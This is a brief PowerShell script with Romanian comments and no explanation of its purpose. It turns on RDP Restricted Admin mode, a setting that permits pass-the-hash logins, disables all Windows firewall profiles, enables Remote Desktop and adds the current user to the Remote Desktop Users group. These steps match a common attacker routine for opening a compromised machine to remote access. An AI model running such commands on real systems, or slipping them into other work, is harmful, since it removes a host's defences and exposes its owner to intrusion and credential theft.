# Dezactivează "DisableRestrictedAdmin"
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0

# Oprește firewall-ul Windows
Set-NetFirewallProfile -Enabled False

# Activează RDP (Remote Desktop Protocol)
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0

# Adaugă utilizatorul curent în grupul "Remote Desktop Users"
Add-LocalGroupMember -Group "Remote Desktop Users" -Member $env:USERNAME